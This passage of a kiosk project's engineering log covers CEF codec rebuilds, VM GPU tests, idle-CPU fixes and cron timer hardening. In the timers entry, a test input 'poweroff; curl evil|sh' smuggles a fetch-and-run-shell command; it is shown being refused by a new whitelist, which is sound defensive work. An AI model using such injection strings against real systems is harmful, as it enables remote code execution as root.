confirmation to proceed there, non-destructively, after the "do not touch"
constraint in the original brief was flagged back and resolved), and left it
running per the user's standing instruction to keep that domain up.

VERIFIED, in order, cheapest to most convincing:
  1. canPlayType flips from "" to "probably" for H.264 baseline/high and
     AAC-LC/HE on both wheels. HEVC/AC3/EAC3/Theora/MPEG-TS stay "no" -
     expected: ffmpeg_branding=Chrome does not bring AC3/EAC3/DTS, and HEVC
     needs hardware decode neither guest has (see the use_vaapi/use_v4l2_codec
     finding below).
  2. A REAL H.264 FILE PLAYS on both guests: bbb60_1080p_h264.mp4 (the exact
     clip that failed DEMUXER_ERROR_NO_SUPPORTED_STREAMS on the old wheel) -
     CDP Media domain reports codec=h264, profile "h264 high", correct
     1920x1080, 0 dropped frames every time it was measured. No Skia segfault
     under real sustained playback, not just at process start - confirms the
     is_official_build=true + PGO fix (CLAUDE.md) holds under load.
  3. Confirmed through the manager's OWN embedded viewer, not just a
     standalone CEF instance: removed the temporary headless stopgap
     (`unitotem-manager.service.d/10-headless-stopgap.conf`, added earlier
     because no cp313 wheel existed yet), restarted the real manager
     (NRestarts stayed 0, still answering 80/443 with 307 afterwards), and
     drove a NEW CDP page target against its real port 9223 without touching
     any existing browser/iframe/scheduler state. Numbers matched the
     standalone probe closely (see table).
  4. `utils/system/gpu.py` picked the `nvidia` profile correctly on the real
     trixie/GTX1060 guest, same reasoning string as documented in 8438cc9.

FULL MATRIX, 1080p, whole process tree, CDP Media domain for the decoder,
zero dropped frames in every cell:

  configuration                       H.264 (FFmpegVideoDecoder)  VP9 (VpxVideoDecoder)
  GTX 1060 passthrough, standalone          26.3 %                     39.5 %
  GTX 1060 passthrough, real viewer         27.5 %                     38.5 %
  virtio-vga / llvmpipe, no GPU              32.5 %                     46.1 %

Both decoders are software in every cell - NVIDIA VA-API is refused by
Chromium (finding below); virtio has no VA-API path at all. The GPU config is
consistently ~5-6pp cheaper than no-GPU in both codecs (the compositing
benefit already documented elsewhere, not a decode benefit - decode itself
never moves off the CPU anywhere in this matrix). H.264 is consistently
cheaper than VP9 within every config (libavcodec's H.264 decoder vs libvpx's
VP9 one) - this IS the no-regression proof: adding codecs did not make VP9
worse anywhere, and H.264 was never more expensive than the VP9 path it sits
next to.

CAVEAT, stated plainly rather than glossed over: `unitotem-test` (4 vcpu) and
`unitotem-cpu` (6 vcpu) are different VM definitions on the same physical
host, so the GPU-vs-no-GPU rows are not a byte-identical before/after on one
machine. The %-of-one-core metric (utime+stime deltas) is not vcpu-count-
sensitive the way wall-clock throughput would be, and the internal
consistency (H.264 < VP9 in every config, GPU < no-GPU in every config,
standalone probe and real viewer agreeing within ~1pp on the same guest) is
the reason to trust the cross-VM comparison despite that difference.

WHAT THE BROWSER ACTUALLY IS: CEF 147.0.10, Chromium 147.0.7727.118, V8 14.7.
Not behind at all - every piece of Chromium's Linux hardware-decode machinery
is present in the binary. So "the fork is too old" is NOT the explanation for
anything here.

WHY THERE WERE NO PROPRIETARY CODECS: the wheel is built on Spotify's prebuilt
CEF distribution, which uses Chromium's default ffmpeg_branding=Chromium.
ffmpeg is statically linked into libcef.so (no libffmpeg.so to swap), so the
only fix is building CEF from source with proprietary_codecs=true and
ffmpeg_branding=Chrome. DONE: an official (is_official_build=true, with PGO)
CEF 147 binary distribution was built from source with those flags and
verified clean (no errors in the build log, libcef.so present, resolved
args confirmed proprietary_codecs=true / ffmpeg_branding="Chrome" /
enable_platform_hevc=true / use_vaapi=true). See CLAUDE.md for the
is_official_build trap that cost one full build cycle before this one.

A cp311 wheel was built from it in the cefpy-wheel-cp311 container (recipe:
VM-TESTING.md sec. 8b) and is staged at
vendor/cefpython-wheels/cefpython3-147.0.dev0-cp311-cp311-linux_x86_64.whl
(gitignored, local only). A cp313 builder container (cefpy-wheel-trixie) is
also built and standing by, in case the re-provisioned VM turns out to run
Python 3.13. NEITHER WHEEL HAS BEEN INSTALLED OR TESTED ON A GUEST YET -
codecs are confirmed present in libcef.so by inspection, not yet confirmed
playing a real H.264 file end to end. That is the next step once the guest's
Python version is confirmed and the VM is free to touch again.

The one measurement taken with an *unofficial* build of this same source
config (before the official rebuild) showed the codec strings resolve and
the crash is unrelated to codecs - it's the allocator mismatch, see CLAUDE.md.

WHY DECODE IS IN SOFTWARE ON NVIDIA: Chromium refuses VA-API on NVIDIA on
purpose (vaapi_wrapper.cc skips nvidia-drm devices; VaapiOnNvidiaGPUs is off
by default, and forcing it on makes nvidia_drv_video.so fail to initialise
inside the GPU process anyway). Nothing to enable there. Evidence is the CDP
Media domain, not CPU: kVideoDecoderName=VpxVideoDecoder,
kIsPlatformVideoDecoder=false, and SystemInfo.getInfo's videoDecoding array
empty in every configuration tried.

CORRECTION to an earlier note in this file: `VaapiVideoDecoder` is NOT a
Chromium feature - it is only a decoder *name* string (media/base/decoder.cc).
Passing it in --enable-features= is a silent no-op. The real gates
(kAcceleratedVideoDecodeLinux, kAcceleratedVideoDecodeLinuxZeroCopyGL) are
already on by default when VA-API is compiled in. See CLAUDE.md for the full
finding, including the much bigger one: on a stock arm64 build,
use_vaapi/use_v4l2_codec both default false regardless of hardware, so the
*entire* hardware-decode client is compiled out (gpu_mojo_media_client_stubs.cc
instead of _linux.cc) - not "fails to accelerate", the code path does not
exist in the binary, and no runtime switch brings it back. Reaching V4L2 on a
Pi needs use_v4l2_codec=true in GN_DEFINES for that arm64 build specifically.

MEASURED, 1080p, whole CEF process tree, CDP Media domain for the decoder,
old codec-less wheel, both configurations:

  configuration                     VP9            H.264
  GTX 1060, proprietary 535       76.5 %         will not play
  virtio-gpu / llvmpipe           77.0 %         will not play

  H.264 fails as DEMUXER_ERROR_NO_SUPPORTED_STREAMS in both (expected - this
  is the OLD wheel, kept here only as the historical baseline). VP9 is
  VpxVideoDecoder (software) in both, 0 dropped frames in both. RE-MEASURED
  with the new wheel: see the full 3-row matrix (standalone + real viewer +
  no-GPU) in the entry above - H.264 now plays everywhere and costs LESS than
  VP9 in every configuration, so there is no regression to report.

DONE (8438cc9): acceleration switches are now chosen from what the machine is.
utils/system/gpu.py detects the stack from the filesystem only and maps it to a
profile table that is data, not branches. Unknown hardware gets the empty
profile, so it keeps today's behaviour exactly - verified by the virtio guest
landing on it before the software profile was taught about virtio-pci. Profiles
measured: nvidia, software. Profiles reasoned from Chromium source but NOT
measured: vaapi (no Intel/AMD machine here), v4l2 (no Pi here) - VERIFIED in
gpu.py says why for each, and what evidence would promote them.

DONE: codec matrix via CDP re-run on the new wheel, a real H.264 file actually
playing (not just canPlayType), no Skia segfault under sustained playback, CPU
cost of H.264 next to VP9 on both virtio and the GTX 1060 (both standalone and
through the real embedded viewer), and confirmation the software path did not
regress - H.264 costs less than VP9 everywhere it was measured. See the
"DONE AND CLOSED OUT" entry above for the full matrix and evidence chain.

STILL OPEN:
  - arm64/Raspberry Pi remains entirely unverified in practice, and now has a
    much sharper reason why: see the use_vaapi/use_v4l2_codec finding above.
    No arm64 wheel with codecs exists; the fork's CI-published arm64 wheels are
    Spotify-based too, so they have the same codec gap AND the same missing
    hardware-decode client unless built with explicit GN flags for arm64.
  - HEVC: enable_platform_hevc=true in the new build, but that is hardware-only
    decode on Linux - expect it to stay unplayable wherever VA-API/V4L2 is not
    engaged. AC3/EAC3/DTS stay off.
  - Licensing: enabling ffmpeg_branding=Chrome moves the H.264/AAC patent
    question onto whoever distributes the image (VM-TESTING.md sec. 8b). Needs
    a business decision, not a technical one; recorded, not resolved.

NOTE, still open, needs a decision: unitotem-system commit 76f3511 configures
hardware decode via /etc/chromium.d/50-unitotem-accel, on the premise that "the
manager drives Chromium over the DevTools protocol rather than embedding a
renderer". That is not this codebase - the manager embeds CEF in-process via
cefpython, and the kiosk image installs no chromium package at all (checked:
`which chromium` empty, dpkg count 0, no /etc/chromium.d). That file configures
a browser that is not there and has no effect on the viewer. It also asks for
--enable-features=...,VaapiVideoDecoder, which per the correction above does
nothing even where the file WOULD apply. The switches that actually matter are
the ones 8438cc9 now sets in the right place, inside the manager itself.

(2026-08-08) Screen control (SCREEN-CONTROL-PLAN.md): step 2 of 7 DONE.

Timers. Both bugs the plan identified are fixed, and the command a cron job
runs is now a looked-up named action rather than anything a request can shape.

  - UniCron.serialize() did int(str(job.minute)) on all five fields, which
    raises ValueError on any slice that is not a plain number. '*' is the
    default the web UI offers for every field, so the first realistic timer
    anyone creates - "every day at 22:00", whose last three fields are all
    '*' - blew up getJobs for the WHOLE list and made every timer on the node
    invisible. All five fields are now the raw slice string, which also means
    '*/15', '1-5' and '0,30' survive a round trip for the first time.
  - timers.vue deleteItem() only spliced the local array and never sent
    Settings/Cron/deleteJob, so a deletion looked like it worked until the
    next refresh brought the timer back. It sends the command now and lets
    the backend's reply rewrite the list.
  - utils/system/crontab.py grew an ACTIONS registry ('pwr', 'reb' -> absolute
    paths). new() and editJob() look the command up and refuse anything else;
    the duplicated '/usr/sbin/' + ('poweroff' if ... else 'reboot') in both
    crontab.py and api/system/cron.py is gone. These lines run as root and cron
    hands them to /bin/sh, so this is the difference between a whitelist and a
    command-injection hole.
  - serialize() also maps the command BACK to its action key and adds 'known'.
    It used to send the full path while the UI matched against 'pwr'/'reb', so
    the Action column had always rendered a bare '/usr/sbin/poweroff'. A job we
    did not write is now reported as-is, flagged not-known, and its schedule
    stays editable while its command is left alone.
  - The five schedule fields are comboboxes now, not selects: any cron slice is
    legal and a select would silently blank a job using one. They are validated
    with CronSlices.is_valid BEFORE the crontab is opened, because
    CronTab.__exit__ calls write() unconditionally - exception or not - so a
    slice rejected halfway through setall() would have been written back
    half-applied.
  - Removed the fake seeded "reboot at 00:00" row that looked like a real
    timer until the first backend reply, and wired the unused setJobEnabled to
    a per-row switch.
  - Option values in timers.vue are all strings now. They were numbers while
    '*' was a string, and getMonthTitle/getDayOfWeekTitle match with ===, so
    the moment the backend started sending raw slices a '1' would no longer
    have matched a 1 and the table would have shown bare numbers instead of
    month and day names.

Verified against the real root crontab on unitotem-test, end to end over the
WebSocket API: "every day at 22:00" is created and listed (the case that used
to break the list); '*/15' with '1-5' round-trips; setJobEnabled comments and
uncomments the line; deleteJob removes the right job and leaves the other; an
invalid slice and a command of "poweroff; curl evil|sh" are both refused with
the crontab left untouched. Plus 17 in-memory checks on serialize()/new().

NEXT: step 3 (manager/tests/ + pytest infrastructure).

DEFERRED from step 2, deliberately: screenctl.py and the screen power/off
actions in the registry. Their entire body is a call into utils/system/screens,
which step 4 creates - shipping them now would mean offering a timer action
that does nothing. They land with the hardware layer instead. The registry is
already the extension point.

(2026-08-07) Screen control (SCREEN-CONTROL-PLAN.md): step 1 of 7 DONE.

Assignments are now keyed on (viewer, RandR output name) instead of
(viewer, window_id), in manager/webview/controller.py. window_id is minted by
app.py's _next_id and never reused, so an output that goes away and comes back
returned under a new number and orphaned its assignment - which is exactly what
`xrandr --output X --off/--auto` will do once step 4 lands, and which already
contradicted "the playlist outputting to that window must be unaware of the
change". The output name survives the cycle.

Deliberately minimal: the playlist loops and the command channel still address
a window by window_id. Only the assignment map is re-keyed, and
_restore_assignments - which already ran on every WebviewInfo update and was
already idempotent - resolves output name -> current window_id. 486e67f's idle
push is untouched: the re-keying changes which windows land in that branch,
not the branch.

viewer_assignments.json now accepts three formats per record: the viewer-wide
dict, the window_id-keyed list, and the screen_name-keyed list it now writes.
The older two need the viewer to say which window is on which output, so they
are parked and resolved on the first WebviewInfo. A record whose window is not
present right now is KEPT pending rather than dropped (window numbering
restarts with the viewer, so an unplugged screen usually takes its number back)
and _save_assignments writes pending records back in their original format, so
an unrelated assign() from the web UI cannot erase them.

Also fixed here, because the off/on cycle turns it from rare into routine:
closing a window never detached it from its playlist loop, so the loop went on
multicasting Show to a window_id nothing answered to. _restore_assignments now
prunes windows the viewer no longer has.

Verified on unitotem-test (GTX 1060 passthrough, real 4K monitor on DP-1):
  - the VM's own real format-2 file migrated live - window 0 -> DP-1 resolved
    and rewritten, window 1 kept pending because that screen is not connected
  - manager restarted with DP-1 off reports screens=[] windows=[] and stays
    reachable; DP-1 --auto then creates the window and it comes back with its
    playlist attached, resolved from the file by output name
  - 4 consecutive off/restart/on cycles, pending record preserved every time
  - 24/24 checks in a logic harness covering all three formats, the collision
    case, and the off/on cycle under a NEW window_id

One thing chased and explained rather than left as a ghost: a pending record
appeared to vanish once. It was the collision case - the returning window took
number 1, which resolved onto DP-1, which the named record had already claimed.
The named record wins (newer, unambiguous), which is right, but it was silent
and looked exactly like an assignment going missing. It now logs a warning.

NOT verified, and it cannot be on this VM: the mid-run off/on cycle with the
window actually being destroyed and recreated. That needs two outputs, and the
last-screen blindness recorded below means a single-output node never notices
its only screen going away at all - so the window is never destroyed and the
bug cannot bite there. Covered by the logic harness only until there is a
second monitor on the passthrough GPU, or the virtio config.

NEXT: step 2 (timers - the serialize() ValueError on '*', the deleteItem() that
never calls deleteJob, and the named-action registry with uuid indirection).

(2026-08-07) Viewer idle CPU: root cause found and fixed (9977db2).

The question was whether the post-replug CPU storm is a Chromium/software-
rasterisation artefact or a UniTotem bug. It is a UniTotem bug, in our own
boot-screen.html, and it has nothing to do with re-plugging.

Control experiment (the decisive one), standalone CEF in a raw Xlib window with
no Qt and none of the manager's code, same VM, same 5120x2160 surface:

  truly static page                       0.0 % of a core
  boot-screen.html as shipped           178.6 %
  boot-screen.html, animations paused     0.5 %

So CEF is innocent. In the manager, the same window on the same screen with the
same re-plug history measures 31.9 % on the logo, 1.4 % as soon as show() puts
content in the iframe, 32.2 % back on the logo. Per animation, at 5120x2160:
both paused 1.6 %, glow (text-shadow) alone 203.8 %, rotation (ring) alone
58.7 %.

Fix: animate opacity/transform instead of paint properties, and step the frame
rate. Manager, whole process tree, before -> after:

  step                             at 4c96a0f    after 9977db2
  A  single screen 1280x800            1.6            1.0
  B  first plug   @ 5120x2160        187.8           30.5
  C  unplug                            1.5            1.2
  D  second plug  @ 5120x2160        187.6           31.0
  E  unplug                            1.3            1.2
  F  third plug   @ 1024x768          35.7            9.3
  G  unplug                            1.3            1.2

An ordinary single-screen 1280x800 node idling on the logo: 38.5 % -> 6.9 %.
Rendering unchanged (RMSE 0.8 %, 0.13 % of pixels differing by >3 %).

THEN FIXED on top of it, 486e67f: an unassigned window now shows the idle page
(unitotem-no-assets) instead of the boot screen, because such a window is idle,
not booting - a spinner meaning "loading" while nothing loads is the wrong
screen, and it was the only thing that made an idle node cost anything.
Idle cost of unassigned windows, whole process tree:

                                        before   after
  one unassigned window @1280x800        8.4 %   1.3 %
  plus one @5120x2160                   29.5 %   1.2 %

The choice between that page and the first-boot welcome screen is now
idle_asset() in utils/models/assets.py, shared with AssetsManager.current so
161e79a's precedence cannot drift. The push lives in
WebviewManager._restore_assignments, the only place that sees per window
whether a playlist is attached. boot-screen.html is untouched and is still what
a window loads at startup - verified off the framebuffer that the logo still
appears while the manager comes up.

Also fixed along the way (1f3a485): the glow copy added by 9977db2 was still
generating its own spinner ring, because `.halo::before` ties on specificity
with `.loader::before` and lost on source order - a third animation nobody
could see. Ask document.getAnimations() rather than reading the CSS.

STILL OPEN:
  - The boot screen itself, while it is legitimately up during startup, still
    costs ~27 % of a core at 5120x2160 and ~7 % at 1280x800. That residual is
    software compositing and cannot be removed in CSS: with no GPU every
    animated frame re-composites the whole surface. A single
    compositor-animated ring and nothing else still costs 51.9 % at 60fps and
    18.1 % at 20fps at 5120x2160. Levers left: fewer frames, or a GPU.
  - PRE-EXISTING BUG, found while testing 486e67f, not fixed here because it is
    not in manager/webview/: on a genuine first boot the welcome screen never
    gets shown. PlaylistsManager.load() takes its "no playlists.json" branch,
    creates an empty default playlist and calls _save_index(), which sets
    environ._unitotem_first_boot = False - at startup, before any viewer has
    connected. So the flag 161e79a wired up is already clear by the time
    anything asks idle_asset()/AssetsManager.current, and a fresh node shows
    the plain no-assets page instead of the hotspot credentials that are the
    only way into it. Reproduced on the VM: delete playlists.json, restart, the
    screen shows unitotem-no-assets. The flag itself works
    (idle_asset() returns unitotem-first-boot when it is set) - it is
    _save_index() clearing it during bootstrap that is wrong.
  - Not investigated here, and owned by SCREEN-CONTROL-PLAN.md step 1: keying
    assignments on the RandR output name instead of the incrementing window_id,
    so a re-plugged monitor resumes its playlist instead of coming back
    unassigned. 486e67f deliberately does not touch the keying question.
    DONE - see the step 1 entry at the top of this file.

TEST VMS - there are TWO, do not confuse them:
  - 'unitotem-test'  192.168.122.50 - the main one, described in VM-TESTING.md,
    currently carrying the GTX 1060 passthrough work.
  - 'unitotem-cpu'   192.168.122.51 - a SECOND, separate domain created for the
    idle-CPU investigation: its own MAC (52:54:00:11:70:02), its own DHCP
    reservation on libvirt's 'default' network, its own overlay
    (/var/tmp/unitotem-cpuvm/overlay-cpu.qcow2) over the same base image, and
    deliberately still on plain virtio-vga with heads=2 so software rendering
    and connector hot-plug stay reproducible. Kept running on purpose. Note it
    has rsync at /usr/bin/rsync, not at $VM_RSYNC_PATH, so deploying to it
    needs VM_HOST=192.168.122.51 VM_RSYNC_PATH=/usr/bin/rsync.

Measurement helpers left on unitotem-cpu: /var/tmp/cpumeas.py (tree +
per-thread deltas), /var/tmp/cefctl.py (standalone CEF host, CDP on 9333),
/var/tmp/ctl2.sh (run a URL in it at a geometry and measure), /var/tmp/plug.sh
(force Virtual-2 on/off), /var/tmp/seq.sh (the whole A-G sequence),
/var/tmp/idleseq.sh (idle cost with no assignments at all), /var/tmp/cdp.py,
/var/tmp/anim.py, /var/tmp/shot.py.

UPDATE (2026-08-09): none of the above survived. The host rebooted at some
point, which stops every libvirt domain (no autostart configured), and
/var/tmp on this kiosk image is a 64 MiB tmpfs (CLAUDE.md gotcha) - so a
guest restart wipes it regardless of "kept running on purpose". Confirmed:
unitotem-cpu came back up fine (manager active, answering on 80/443,
uptime ~17 min after a manual `virsh start`), but `ls /var/tmp/*.py
/var/tmp/*.sh` is empty. The investigation itself is unaffected (the fix is
merged, see the top of this file), but reproducing these exact numbers
again means regenerating the rig from scratch per the recipe above - it is
not there to just re-run.

(2026-08-06) Idle-CPU investigation and GPU acceleration in the test VM.

OPEN, and the real answer to the "70-85% of a core while idle" mystery: the
manager is NOT idle-busy. It costs ~1% of a core and stays there across
restarts (5 consecutive systemctl restart cycles: 1.1 1.3 1.4 1.4 1.1 %,
constant 8 processes / 2 renderers, no orphans). The load appears only when a
screen is hot-plugged onto an instance that has already had one unplugged.
Measured on a freshly restarted manager, one screen at 1280x800 plus the
second virtio output:

  step                                  %core   renderers
  A  single screen                        1.4       2
  B  first plug   @ 5120x2160             1.1       4     <- quiet
  C  unplug                               1.1       4     <- renderers NOT freed
  D  second plug  @ 5120x2160           161.1       5     <- the state
  E  unplug                               1.7       5     <- drops immediately
  F  third plug   @ 1024x768             28.0       6
  G  unplug                               2.0       6

Two separate defects, both to be fixed as their own task (deliberately NOT
fixed during the measurement session):

 1. FIXED in 4c96a0f. Renderer processes leak on screen removal - 2 -> 4 -> 5
    -> 6 across plug/unplug cycles, never reclaimed. This is exactly the
    "6 renderers for 2 windows" clue from the previous session: that instance
    had simply been hot-plug-tested. Re-verified on the GPU configuration after
    the fix: the count now stays at 2 renderers / 8 processes across four
    off/on cycles instead of climbing to 7 / 14.
 2. FIXED in 9977db2, and the diagnosis above was wrong about what triggers it.
    The burn is not caused by re-plugging at all: it is boot-screen.html's two
    infinite CSS animations, which drove paint-only properties (text-shadow on
    .glow, box-shadow riding along in the ring's rotation keyframes) and so
    made Chromium re-rasterise the whole wordmark every frame. Hot-plug only
    came into it because window_id increments and is never reused, so a newly
    plugged screen gets a window with no entry in viewer_assignments.json,
    never receives a Show command, and sits on the logo forever - which is
    also why the first plug of a session could look quiet and later ones did
    not. See the CLAUDE.md gotcha for the three measurements that settle it
    (standalone-CEF control, same-window before/after, per-animation pause).
    Note the row "A single screen 1.4%" above is quiet for the same reason in
    reverse: window 0 *is* assigned, so its logo is display:none.

The old QXcbEventQueue at 8.3% is a symptom of the same X traffic, not a cause.

GPU ACCELERATION - now available in the test VM, by passing a real GTX 1060
through instead of chasing virgl (tools/unitotem-test-gpu.xml; full procedure
and every trap in VM-TESTING.md, "GPU acceleration"). Chromium goes from
gpu_compositing: disabled_software / rasterization: unavailable_off to both
"enabled". What that does and does not buy, all measured on the same VM:

  configuration              idle    BBB 1080p VP9 playback   replug storm
  virtio-vga (llvmpipe)      1.0%    46.9%  @1280x800         161% @5120x2160
  1060 + nouveau             1.1%    46.4%  @1280x800         115% @3840x2160
                                     86.1%  @3840x2160
  1060 + NVIDIA 535          1.4%    ~44%   @3840x2160        ~60% @3840x2160

  - Idle is ~1% everywhere; the GPU changes nothing there because there was
    never anything to accelerate.
  - Video playback is NOT helped at matched resolution (46.9% vs 46.4% at
    1280x800): VP9 is decoded in software in every configuration (three
    CodecWorker threads), because Chromium wants VA-API and neither driver
    offers usable VP9 decode here. video_decode: "enabled" in the feature
    stats only means "not blocklisted", not that anything is offloaded.
    Zero dropped frames in every configuration.
  - What the GPU does buy is compositing at high resolution: at 3840x2160
    nouveau spends 51% of a core in VizCompositorThread and the proprietary
    driver 1.4%, which halves total playback cost (86% -> ~44%).
  - The repaint storm survives real hardware acceleration, so it is a genuine
    bug and not a symptom of llvmpipe.

The proprietary driver is the better of the two by a wide margin; nouveau is
accelerated but its compositing path is expensive.

DEAD END - Looking Glass. Its Linux host app aborts on lgmpHostMemPtr before
publishing a frame, identically against a plain file, and upstream calls it
"incomplete and not ready for usage". Removed from the repo in cf44854; do not
retry it - the card drives a physical monitor and everything is measured over
SSH and CEF DevTools.

ALSO FOUND - this cefpython3 build ships without proprietary codecs: no H.264,
no AAC, no Theora (VP8/VP9/AV1/Opus/Vorbis/MP3 are fine). An H.264 MP4 asset
fails with DEMUXER_ERROR_NO_SUPPORTED_STREAMS and shows nothing. A kiosk that
cannot play the most common video format on the web needs a decision: rebuild
the CEF wheel with proprietary codecs enabled, or accept the limitation and say
so in the UI.

(2026-08-05) Qt6+CEF viewer: testing in the VM.

Test VM rebuilt from scratch on kiosk-2026-08-04-amd64, now running under
libvirt as domain 'unitotem-test' with a fixed IP (192.168.122.50) instead of
port forwarding, so the manager keeps its real default ports 80/443.
Full procedure written down in VM-TESTING.md; helpers in tools/.

Verified this session, on the current code, with no manager restarts:
  - viewer starts, boot screen renders, CEF subprocesses healthy
  - hot-plug  -> Viewers/list pushed within ~1s, correct geometry
  - hot-unplug -> pushed within ~1s, back to 1 screen/1 window
  - window_id increments and is never reused (0 -> 1 -> 2)
  - systemctl stop returns in 66ms (the CEF/SIGTERM hang stays fixed)
  - no white flash observed on window creation after the black-background fix
    (sampled at ~3fps, which would miss a single-frame artefact)

FIXED this session - starting with zero screens no longer invents a screen.
QGuiApplication always keeps at least one QScreen, so with no output at all
the xcb backend leaves a placeholder named after the X display (':0.0', 0x0)
where a real output would be named after its RandR output. The manager was
treating it as a real screen: it opened a window on it and reported it.
_is_placeholder()/_real_screens() in manager/webview/app.py now filter it.
Verified: booting with every connector forced off reports screens=[]
windows=[], and plugging one in then opens exactly one window.

OPEN - unplugging the LAST screen goes unnoticed. Viewers/list keeps
reporting that screen and its window, and nothing is pushed. Root cause,
measured directly on the VM:
  - Qt emits NO signal whatsoever for this transition - not screenRemoved,
    not screenAdded, not geometryChanged/availableGeometryChanged/
    physicalSizeChanged/refreshRateChanged, not primaryScreenChanged.
  - In a bare QGuiApplication with no windows, Qt renames the QScreen in
    place to ':0.0' a few seconds later (geometry stays stale).
  - In the manager, which owns a window on that screen, not even the rename
    happens: it is still 'Virtual-1' 1280x800 more than 20s later.
So there is nothing in Qt's API to observe, and _is_placeholder() cannot
catch it either. Fixing it needs a RandR event source of our own. Options,
not yet decided (the first two are the realistic ones):
  a) python-xlib in a thread, selecting RRScreenChangeNotify/RROutputChange
     on the root window - clean and genuinely event-driven, but adds a
     dependency to requirements.txt and therefore a venv/.deb rebuild;
  b) QAbstractNativeEventFilter over xcb events - no new dependency, but the
     RandR event base has to be worked out to identify the events;
  c) udev/DRM monitoring (pyudev) - another dependency, further from the
     X-level truth Qt itself uses.
Until then this violates "state changes reach the web UI purely through
events" in CLAUDE.md. Note the manager itself stays perfectly healthy with
zero screens - it is only the reported state that goes stale.

FIXED this session - the built-in internal pages now render. They were
never visible before.
utils/models/assets.py:187-188 defines the 'no assets' and 'first boot'
placeholder assets as https://localhost/unitotem-no-assets and
.../unitotem-first-boot. The manager serves a self-signed certificate
(/etc/ssl/unitotem.pem), CEF validates it like any other site, and there is
no certificate-error handling anywhere in manager/ - so instead of the
welcome screen a device shows Chromium's grey broken-page error. Confirmed
in the VM: the CDP target list has an iframe on
https://localhost/unitotem-first-boot, the screen shows the error page, and
from inside the VM `curl` gets 307 with -k and fails outright without it.
This hits every real device on its very first boot, which is exactly when
the welcome/hotspot/QR screen is the only thing the user can see.
Fixed by pinning this node's own public key:
--ignore-certificate-errors-spki-list is set from the SPKI hash of
/etc/ssl/unitotem.pem (_own_cert_spki_hash in webview/app.py). Note that
RequestHandler.OnCertificateError, the obvious candidate, does NOT work
here and was tried first: the pages are loaded in an iframe by
boot-screen.html, and Chromium rejects certificate errors on subframes
without ever consulting the handler - the callback is simply never invoked.
A blanket --ignore-certificate-errors would have worked but would also stop
validating scheduled remote assets.

FIXED this session, found immediately behind that one - the first-boot page
required authentication. routers.scheduler ends in a catch-all
"/{path:path}" guarded by Depends(LOGMAN), and it was registered before
/unitotem-{page}, so the catch-all matched and the device's own screen
showed the login form. The route is now declared before the routers and is
served without a session but only to loopback (non-local callers get 404,
which also keeps the hotspot SSID and password off the network). Verified:
200 from inside the VM, 404 from the host, and the welcome screen with
hostname/IP/OS renders on the framebuffer.

MINOR - the welcome page shows a scrollbar on the right in the viewer.
Cosmetic, but it is a kiosk screen and nothing should ever scroll there.

FIXED this session - the image dominant-colour backdrop works again.
Three separate things were in the way, only one of them the obvious one:
  - the backend flattened "no colour chosen" into an explicit rgb(0,0,0)
    before sending it, so the viewer could not tell it apart from a
    deliberate black and never sampled the picture. It now sends null.
  - boot-screen.html is loaded over file://, so a scheduled image is
    cross-origin: drawing it into a canvas tainted it and getImageData threw
    SecurityError. CEF now runs with --disable-web-security and
    --allow-file-access-from-files, which is defensible here - this browser
    only ever shows what the operator scheduled, with no address bar, no user
    input and no cross-origin credentials to steal.
  - the client-side HEAD probe was refused for the same origin reason, which
    is why probe_media_type() lives in the backend.
Verified: a letterboxed image now has bars at srgb(159,113,106), its own
average colour, instead of black.

FIXED this session - viewer/playlist assignments now survive a restart, and
a disconnect no longer throws them away. They were only ever an in-memory
dict (serialize_assignments() had no caller at all), and unregister_webview
deleted the entry outright, so a viewer that merely dropped its connection
lost its playlist. Assignments are written beside the playlists and read
back at startup; a viewer picks its playlist up again when it registers.
Verified: schedule a URL, restart the manager, the page comes back on its
own.

PARTLY DONE - playback of real assets. Verified end to end: a web page and
an image both reach the screen through the scheduler, the image lands in the
image container with fit=contain applied. Still untested: video, audio,
cover/fill, explicit bg_color, default duration and per-asset volume.

FIXED this session - the Viewers page was unreachable. The route /viewers
and the page itself both existed and worked (an assignment matrix, playlists
as rows and viewers as columns), but base.vue's navigation drawer had no
entry for it, so the only way in was typing the URL. Added next to Scheduler,
which is where it belongs - it is a top-level page, not a setting.

FIXED this session - assignment is now per window, as the spec asks.
Keys went from instance_id to (instance_id, window_id) through the controller,
the Show payload (the viewer already understood window_id - app.py:488 - it
was simply never sent), the Viewers API and the page. A playlist may drive any
number of windows; a window shows one playlist. The stored file changed shape
and the loader still accepts the previous one, spreading a viewer-wide entry
over that viewer's windows once they are known.
Restoring is driven by the window list rather than by connection, because a
viewer registers before reporting its screens - doing it at registration
silently produced zero windows and wiped the saved assignments, which is a
trap worth remembering.
Verified on the VM with two real screens: Default on window 0, a second
playlist on window 1, each showing its own asset (checked through CEF's
DevTools target list and both framebuffer heads).

FIXED this session - a playlist parked with nothing enabled now wakes up.
iter_wait() blocks on _waiting_evt, and that event is pulsed only inside
__set_current, so enabling an asset later changed a flag nobody was watching:
the screen stayed on the placeholder until a restart. AssetsManager gains
revalidate_current(), called by every scheduler operation that adds, removes,
enables or disables an asset. Verified on the VM with no restart at all:
disabling the only enabled asset falls back to the placeholder, re-enabling it
brings the content straight back.

WAS OPEN, superseded - assignment per viewer instead of per window.

=== PLANNED (decided with the user, 2026-10-11, not started unless noted) ===
- Display power: mechanisms CEC, DDC/CI, WOL (the touchscreen monitor itself has WOL, its node does not) and
  serial (vendor RS-232 command tables, user-configurable); other mechanisms later. Off = panel off, not the OS.
  The panel must be switched on after boot and the hotplug detected. Builds on SCREEN-CONTROL-PLAN.md (steps 4-7).
- Suspend with scheduled wake-up: compute the delta between now and the next wake time for rtcwake; decide the
  RTC timezone (UTC/local) like installers do; refuse before suspending if there is no usable RTC.
- Multi-page PDF: start from CEF's built-in viewer with every bar removed (test first: is the PDF plugin in our
  CEF 147 build, do #toolbar=0&navpanes=0&scrollbar=0&page=N work, does changing page work); fallback pdf.js.
  `duration` = seconds per page; the scheduler expands a PDF into one step per page.
- Asset preview in the web UI as a window, not a popup.
- VNC in the browser: noVNC + x11vnc/TigerVNC, view-only, localhost only, started on demand and stopped on
  close/idle, token proxied through the manager (admin only).
- Remote terminal: xterm.js + pty running `login` (OS account, separate from web users), admin capability to open,
  attempt limit, audit log. Images carry NO working password: first access is a setup wizard (web admin + OS
  account) protected by a claim code shown on the totem screen; remove the admin:admin fallback in routers/backup.py.
  PAM: auth takes 0.05-0.10 s on the x86 VM, failure 1.6-3.7 s (pam_faildelay); on a Pi 4 it was seen taking a
  couple of seconds even on success: re-measure on a Pi (run PAM in a thread).
- Desktop-style web UI (windows for settings/terminal/preview/VNC): option A, window manager in the current Vue
  app, gradually; prerequisite is the client API (webui/src/api.js, prototype done on the Updates page).

